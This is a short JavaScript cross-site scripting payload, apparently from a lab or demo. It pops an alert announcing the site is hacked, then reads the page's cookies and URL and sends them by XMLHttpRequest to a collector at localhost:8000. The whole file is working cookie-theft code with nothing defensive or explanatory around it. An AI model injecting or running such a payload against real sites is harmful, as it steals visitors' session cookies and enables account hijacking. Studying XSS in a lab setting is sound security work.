alert('You are hacked! - xss');

var cookie = document.cookie;
var url = document.URL;

var xhr = new XMLHttpRequest();

var targetUrl = 'http://localhost:8000?cookie=' + cookie + '&url=' + url;

xhr.open('GET', targetUrl);

xhr.send();